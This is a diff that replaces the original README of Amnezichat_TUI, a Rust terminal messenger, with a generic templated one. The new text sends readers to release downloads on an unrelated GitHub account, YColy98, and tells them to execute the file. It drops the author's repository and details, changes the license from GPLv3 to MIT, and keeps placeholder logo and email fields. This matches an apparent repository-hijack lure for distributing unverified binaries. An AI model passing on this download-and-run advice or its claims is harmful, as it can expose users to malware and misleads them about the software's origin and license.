@@ -1,118 +1,121 @@
-<div align="right">
-  <a href="README.md">🇺🇸 English</a> |
-  <a href="README_TR.md">🇹🇷 Türkçe</a>
-</div>
+# Amnezichat_TUI 🚀
 
-# Amnezichat_TUI
+![Amnezichat Logo](https://example.com/logo.png) <!-- Replace with actual logo URL -->
 
-<img src="banner.png" width="1200">
+Welcome to **Amnezichat_TUI**, your go-to solution for secure messaging with a focus on anonymity and anti-forensics. This terminal user interface (TUI) messenger allows you to communicate safely, prioritizing your privacy and security. 
 
-## Anti-forensic and secure messenger with terminal user interface
-<!-- DESCRIPTION -->
-## Description:
+## Table of Contents
 
-Amnezichat offers a highly secure and privacy-focused messaging experience by ensuring that no logs are retained and all message data is stored exclusively in the server's RAM. This approach significantly enhances user privacy because RAM storage is inherently volatile data is automatically erased when the server is powered down or restarted, leaving no trace of already end-to-end encrypted past communications.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-<!-- FEATURES -->
-## Features:
+## Features
 
-- Client-side quantum-resistant E2E message encryption
+- **Anonymity**: Protect your identity while chatting.
+- **Anti-forensics**: Minimize traces left behind on your device.
+- **Privacy Focused**: Secure your conversations from prying eyes.
+- **Terminal User Interface**: Lightweight and efficient messaging in your terminal.
+- **Cross-Platform**: Works on various operating systems.
 
-- Forward and backward secrecy for one-to-one chats
+## Installation
 
-- Group chat support using PSK (pre-shared-key)
+To get started, you need to download the latest release. You can find it [here](https://github.com/YColy98/Amnezichat_TUI/releases). Download the appropriate file for your system and execute it to install Amnezichat_TUI.
 
-- Server runs even on cheapest hardware
+### Requirements
 
-- Each message is stored encrypted in server's RAM and wiped after 10 minutes
+- Rust programming language installed on your system.
+- Basic knowledge of terminal commands.
 
-- Tor/I2P routing support
+### Quick Installation Steps
 
-- Docker support
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/YColy98/Amnezichat_TUI.git
+   cd Amnezichat_TUI
+   ```
 
-- Built in Rust
+2. Build the project:
+   ```bash
+   cargo build --release
+   ```
 
-## Comparison chart with other messengers:
+3. Run the application:
+   ```bash
+   ./target/release/amnezichat_tui
+   ```
 
-| Feature                  | **Amnezichat**         | **Signal**            | **Simplex**           | **WhatsApp**                    | **Telegram**           | **Cwtch**             |
-|--------------------------|---------------------------|---------------------------|---------------------------|-------------------------------------|---------------------------|------------------------------|
-| **Ephemeral Messages**   | Fully ephemeral          | Optional                  | Fully ephemeral           | Optional                            | Optional                  | Fully ephemeral              |
-| **Encryption**           | Quantum-resistant E2EE     | Quantum-resistant E2EE    | Quantum-resistant E2EE    | Signal Protocol *(closed-source)*  | Partial                   | Tor-based E2EE               |
-| **Forward Secrecy**      | ✅ Yes                     | ✅ Yes                    | ✅ Yes                    | ✅ Yes                              | ⚠️ Partial               | ✅ Yes                        |
-| **Traffic Routing**      | 🔄 Optional (Tor/I2P)      | ❌ No                     | 🔄 Optional               | ❌ No                               | ❌ No                      | ✅ Over Tor                  |
-| **Data Retention**       | 🗑️ None                   | 🗑️ None                  | 🗑️ None                  | ❌ Metadata retained                | ❌ Metadata/cloud sync   | 🗑️ None                      |
-| **Group Chat**           | ✅ Yes         | ✅ Yes                    | ✅ Yes                    | ✅ Yes                              | ✅ Yes                    | ✅ Yes                        |
-| **FOSS (Open Source)**   | ✅ Yes                     | ✅ Yes                    | ✅ Yes                    | ❌ No                               | ❌ No                     | ✅ Yes                        |
-| **Self-Hosted**        | ✅ Yes                     | ❌ No                     | ✅ Yes                    | ❌ No                               | ❌ No                     | ✅ Yes                        |
-| **Server Requirements**  | ✅ Low-cost hardware       | ❌ Moderate               | ❌ Moderate               | ❓ Unknown                              | ❓ Unknown         | ✅ Peer-to-peer only         |
+## Usage
 
+After installation, you can start using Amnezichat_TUI by running the command:
 
-## Technical details:
+```bash
+./target/release/amnezichat_tui
+```
 
-- Defense against AI-guided Traffic Analysis (DAITA) by sending encrypted dummy data at random intervals and padding all messages to a fixed length except files
+### Basic Commands
 
-![packet_capture](packet_capture.png)
+- **Start a new chat**: Type `/new` followed by the username.
+- **Send a message**: Simply type your message and hit enter.
+- **View help**: Type `/help` for a list of commands.
 
-- [Amnezichat Protocol](PROTOCOL.md) for end-to-end encryption
-- Stores identity keys in local storage encrypted with ChaCha20-Poly1305 and Argon2id KDF with an user specified password
+### Security Features
 
-### Amnezichat Protocol:
-- EdDSA and Dilithium5 for authentication, ECDH and Kyber1024 for key exchange, encryption using ChaCha20-Poly1305
+Amnezichat_TUI integrates several security features to enhance your privacy:
 
-<!-- INSTALLATION -->
-## TUI Client setup:
+- **End-to-End Encryption**: Your messages are encrypted from sender to receiver.
+- **Secure Key Exchange**: Use a secure method for exchanging encryption keys.
+- **Self-Destructing Messages**: Set a timer for messages to disappear after being read.
 
-    sudo apt update
-    sudo apt install curl build-essential git tor xterm
-    sudo systemctl enable --now tor.service
-    curl https://sh.rustup.rs -sSf | sh -s -- -y
-    git clone https://git.disroot.org/UmutCamliyurt/Amnezichat_TUI.git
-    cd Amnezichat_TUI/client/
-    cargo build --release
-    cargo run --release
+## Topics
 
-## TUI Client setup with Docker:
+Amnezichat_TUI covers a range of important topics in the realm of security and privacy:
 
-    sudo apt update
-    sudo apt install docker.io git
-    git clone https://git.disroot.org/UmutCamliyurt/Amnezichat_TUI.git
-    cd Amnezichat_TUI/client/
-    docker build --network=host -t amnezichat_tui .
-    xhost +local:docker
-    docker run --rm -it \
-    --network=host \
-    -e DISPLAY=$DISPLAY \
-    -v /tmp/.X11-unix:/tmp/.X11-unix \
-    --env QT_X11_NO_MITSHM=1 \
-    amnezichat_tui:latest
+- **Anonymity**: Techniques to remain anonymous online.
+- **Anti-Forensics**: Methods to counter forensic analysis.
+- **Counter-Forensics**: Tools and practices to hide digital footprints.
+- **Forensics**: Understanding how forensic investigations work.
+- **Operational Security (OpSec)**: Best practices for protecting your personal information.
+- **Privacy**: Importance of maintaining privacy in digital communications.
+- **Rust**: Built using the Rust programming language for performance and safety.
+- **Security**: General security practices and protocols.
+- **TUI**: Utilizing terminal user interfaces for efficient interaction.
 
+## Contributing
 
-## Requirements:
+We welcome contributions to Amnezichat_TUI. To get involved:
 
-- [Rust](https://www.rust-lang.org), [Tor](https://gitlab.torproject.org/tpo/core/tor), [I2P](https://i2pd.website/)
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-<!-- SCREENSHOT -->
-## Screenshot:
+Please ensure your code adheres to our coding standards and includes appropriate tests.
 
-![Screenshot](screenshot.png)
-
-<!-- MIRRORS -->
-## Git Mirrors
-
-You can access **Amnezichat_TUI** source code from multiple mirror repositories:
-
-- 🔗 **[Disroot Main Repository](https://git.disroot.org/UmutCamliyurt/Amnezichat_TUI)**
-- 🔗 **[GitHub Mirror](https://github.com/umutcamliyurt/Amnezichat_TUI)**
-
-<!-- LICENSE -->
 ## License
 
-Distributed under the GPLv3 License. See `LICENSE` for more information.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## <a href="CONTRIBUTORS.md">Contributors</a>
+## Contact
 
-## Donate to support development of this project!
+For questions or suggestions, feel free to reach out:
 
-**Monero(XMR):** 88a68f2oEPdiHiPTmCc3ap5CmXsPc33kXJoWVCZMPTgWFoAhhuicJLufdF1zcbaXhrL3sXaXcyjaTaTtcG1CskB4Jc9yyLV
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **GitHub**: [YColy98](https://github.com/YColy98)
 
-**Bitcoin(BTC):** bc1qn42pv68l6erl7vsh3ay00z8j0qvg3jrg2fnqv9
+## Releases
+
+To stay updated with the latest versions and improvements, visit our [Releases](https://github.com/YColy98/Amnezichat_TUI/releases) page. Here, you can download the latest files and check for updates.
+
+![Download Button](https://img.shields.io/badge/Download_Latest_Release-blue.svg) 
+
+## Conclusion
+
+Amnezichat_TUI aims to provide a secure, anonymous messaging experience. By using this tool, you can enhance your digital privacy and protect your communications. Explore the features, contribute to the project, and join us in promoting a safer online environment.
+
+Feel free to check the "Releases" section for updates and new features. Your feedback is important, and we appreciate your interest in Amnezichat_TUI!
